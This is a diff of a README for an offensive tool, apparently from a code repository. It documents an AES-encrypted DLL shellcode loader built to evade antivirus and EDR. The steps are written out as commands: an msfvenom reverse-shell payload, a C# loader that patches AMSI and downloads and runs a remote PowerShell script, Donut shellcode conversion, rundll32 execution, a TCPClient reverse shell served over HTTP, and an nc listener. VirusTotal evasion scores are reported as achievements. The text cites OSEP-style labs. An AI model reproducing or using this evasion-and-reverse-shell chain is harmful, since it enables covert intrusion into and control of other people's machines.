@@ -1,90 +1,100 @@
-# ShellcodeEncrypt2DLL
+# 🧬 AES-Encrypted DLL Loader – Donut + PowerShell
 
-A script to generate AV evaded(static) DLL shellcode loader with AES encryption.
+## 🎯 Motivation
 
-Shellcode and API names encryption + Dynamic API loading
+Shellcode generated using tools like `msfvenom` is often highly detectable by modern antivirus and EDR solutions. Even with encoders, typical byte patterns and behavior can trigger alerts. To address this, this project:
 
-Two modes:
-- non-standalone: To make an encrypted DLL **WITHOUT** KEY stored in the DLL.You can use it for sideload/rundll32 but you need to pass the key. (So even if the sample is captured, the shellcode will be still difficult to recover)
-- standalone: To make an encrypted DLL **WITH** KEY stored in the DLL. You can use it for sideload/hijack or in a printnightmare-like scenario.
+- Replaces `msfvenom` with custom shellcode transformed by [Donut](https://github.com/TheWover/donut)
+- Executes it via a C# loader that downloads and runs a PowerShell payload
+- Provides a C++ DLL (`loader.dll`) that, when injected or called via `rundll32`, decrypts and executes shellcode in memory
 
+This method is designed for lab environments similar to **OSEP** and has been tested with **Windows Defender enabled**.
 
+---
 
-VT: 2/72 (13/3/2025)
+## 🧩 Step 1: Build the PowerShell Loader
 
-VT: 3/72 (14/3/2025)
+- The C# loader (`Loader.cs`) patches AMSI via `.NET Reflection`, downloads a remote PowerShell payload, and executes it in memory using `Runspace`.
+- Uses base64 string obfuscation for script names like `shell.ps1`.
 
-VT: 3/73 (27/3/2025)
+ 📌 **Important:**  
+ Make sure the hardcoded IP in `Loader.exe` **matches the IP of the machine hosting `shell.ps1`** via HTTP.
 
-**VT: 0/72 (28/3/2025) (after update)**
+ 📌 **Note:** You may need to reference:
+ ```
+ C:\Program Files\WindowsPowerShell\Modules\PowerShellGet\<version>\System.Management.Automation.dll
+ ```
+---
 
-![](https://raw.githubusercontent.com/restkhz/blogImages/main/img/屏幕截图_20250328_193321.png)
+## 🧪 Step 2: Generate Shellcode with Donut
 
+Convert the compiled `Loader.exe` into raw shellcode using [Donut](https://github.com/TheWover/donut):
 
-
-![](https://raw.githubusercontent.com/restkhz/blogImages/main/img/屏幕截图_20250313_060155.png)
-
-## Usage
-
-You can use this on **Kali** or other linux distributions
-
-Dependencies:
-```
-pip install pycryptodome
-sudo apt install mingw-w64
-```
-I know no one wants to memorize a bunch of arguments…
-**Edit your key in the `ShellcodeEncrypt2Dll.py` first** 
-
-Example:
-```
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 x64/xor_dynamic -f raw > shellcode.raw
-
-python ShellcodeEncrypt2Dll.py --non-standalone shellcode.raw
-or
-python ShellcodeEncrypt2Dll.py --standalone shellcode.raw
+```bash
+donut.exe -i Loader.exe -a 2 -f 1 -b 1 -o shellcode.bin
 ```
 
-Then you will get a `loader.dll`
+**Explanation of Donut flags:**
+- `-a 2`: Target architecture (x64)
+- `-f 1`: Output format: raw shellcode
+- `-b 1`: AMSI/WLDP/ETW bypass level  
+  - `1`: **No bypass**  
+  - `2`: Abort on failure  
+  - `3`: Continue on failure
 
-For a particular antivirus program, we need to patch the dll to bypass…
+💡 *This project uses Donut on Windows and then transfers `shellcode.bin` to a Kali Linux host for encryption.*
 
+---
+
+## 🧪 Step 3: Encrypt & compile:
+
+   # Standalone (key embedded):
+   ```
+   python3 AES_DLL_Builder.py --standalone shellcode.bin
+   ```
+   Transfer the dll file to the Windows Target and:
+   ```
+   rundll32 loader.dll,EPoint
+   ```
+   # Non-Standalone (supply key):
+   ```
+   python3 AES_DLL_Builder.py --non-standalone shellcode.bin
+   ```
+   Transfer the dll file to the Windows Target and:
+   ```
+   rundll32 loader.dll,EPoint "my_key_123"
+   ```
+---
+
+## 🌐 Step 4: Host the PowerShell Reverse Shell
+
+Create a `shell.ps1` PowerShell script containing your reverse shell logic.
+
+📌 **Important:**  
+Ensure that the IP inside `shell.ps1` (e.g. `TCPClient('192.168.1.X', 443)`) **matches the IP of your listener machine**.
+
+Then serve the file using Python:
+
+```bash
+python3 -m http.server 80
 ```
-python patch.py (optional)
+
+---
+
+## 📡 Step 5: Start Listener with Netcat
+
+Use `netcat` (and optionally `rlwrap`) to catch the reverse shell:
+
+```bash
+rlwrap -cAr nc -lnvp 443
 ```
 
-Then you will get a `loader_patched.dll`
+---
 
-For non-standalone:
-```
-rundll32 <path_to_dll>,EPoint <Your KEY>
-```
-You can make you own exe to load this DLL with KEY as well.
+## ⚠️ Legal Notice
 
-For standalone:
-```
-rundll32 <path_to_dll>,EPoint
-```
+This project is for **educational and authorized penetration testing** purposes only.  
+Do not use this code outside of lab environments or without **explicit permission**.  
+Misuse may be illegal and unethical.
 
-As you see, standalone and non-standalone both have `EPoint` as export function.
-
-
-
-
-Your can edit your key in the python script.
-
-## How does it work?
-
-This script will generate a header file for template.cpp, then try to compile with `x86_64-w64-mingw32-g++`.
-The `shellcode` and `function names` like `VirtuallAlloc`, `CreateThread` etc will be encrypted(AES-CBC) with key.
-
-Hide suspicious strings as much as possible…
-
-Considering entropy…
-
-The standalone mode will store the key in the DLL. Decrypt itself when running.
-The non-standalone mode needs your key as a parameter to decrypt itself when running.
-
-## Disclaimer
-
-Submitted to VirusTotal already. Only for educational purposes.
+---
